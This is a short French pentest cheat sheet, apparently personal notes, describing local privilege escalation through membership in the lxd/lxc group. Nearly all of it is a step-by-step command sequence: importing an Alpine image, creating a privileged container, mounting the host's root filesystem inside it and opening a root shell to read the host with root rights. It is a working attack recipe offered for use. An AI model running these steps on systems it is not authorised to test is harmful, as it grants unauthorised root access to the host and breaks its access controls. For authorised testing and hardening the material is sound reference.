# LXD / LXC Group

## LXD / LXC

Si notre utilisateur est membre du groupe lxd / lxc, il est possible de créer un conteneur. Cela nous donne la possibilité d'être root sur ce conteneur, de monter le disque de l'host à l'intérieur du conteneur et donc de le lire avec les droits root.

Télécharger un conteneur tel que alpine:

```bash
wget https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz
```

```bash
lxd init

répondre aux différentes questions
```

Importer notre image d'alpine:

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Lancer le conteneur alpine:

```bash
lxc init alpine r00t -c security.privileged=true
```

Monter le disque de l'host dans le répertoire /mnt/root:

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Spawn un shell à l'intérieur du conteneur:

```bash
lxc start r00t
lxc exec r00t /bin/sh
```
